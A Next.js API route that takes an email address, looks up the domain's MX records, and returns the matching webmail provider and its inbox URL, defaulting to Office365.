import { NextRequest, NextResponse } from 'next/server'
import { lookupMXRecords } from '@/lib/emailVerification'

export async function POST(request: NextRequest) {
  try {
    const { email } = await request.json()

    if (!email) {
      return NextResponse.json({ error: 'Missing email' }, { status: 400 })
    }

    const domain = email.split('@')[1]?.toLowerCase()
    if (!domain) {
      return NextResponse.json({ error: 'Invalid email' }, { status: 400 })
    }

    const mxRecords = await lookupMXRecords(domain)

    // Determine redirect URL based on domain/MX records
    let redirectUrl = 'https://www.office365.com'
    let provider = 'Office365'

    if (domain.includes('gmail.com')) {
      redirectUrl = 'https://mail.google.com'
      provider = 'Gmail'
    } else if (domain.includes('yahoo.com')) {
      redirectUrl = 'https://mail.yahoo.com'
      provider = 'Yahoo'
    } else if (domain.includes('outlook.com') || domain.includes('hotmail.com') || domain.includes('live.com')) {
      redirectUrl = 'https://outlook.live.com'
      provider = 'Outlook'
    } else if (mxRecords.length > 0) {
      const primaryMX = mxRecords[0].exchange.toLowerCase()

      if (primaryMX.includes('google')) {
        redirectUrl = 'https://mail.google.com'
        provider = 'Google Workspace'
      } else if (primaryMX.includes('outlook') || primaryMX.includes('office365')) {
        redirectUrl = 'https://outlook.office365.com'
        provider = 'Office365'
      } else if (primaryMX.includes('yahoo')) {
        redirectUrl = 'https://mail.yahoo.com'
        provider = 'Yahoo'
      }
    }

    return NextResponse.json({
      redirectUrl,
      provider,
      domain,
      mxRecords: mxRecords.map(r => r.exchange),
    })
  } catch (error) {
    return NextResponse.json(
      { redirectUrl: 'https://www.office365.com', provider: 'Office365' },
      { status: 200 }
    )
  }
}









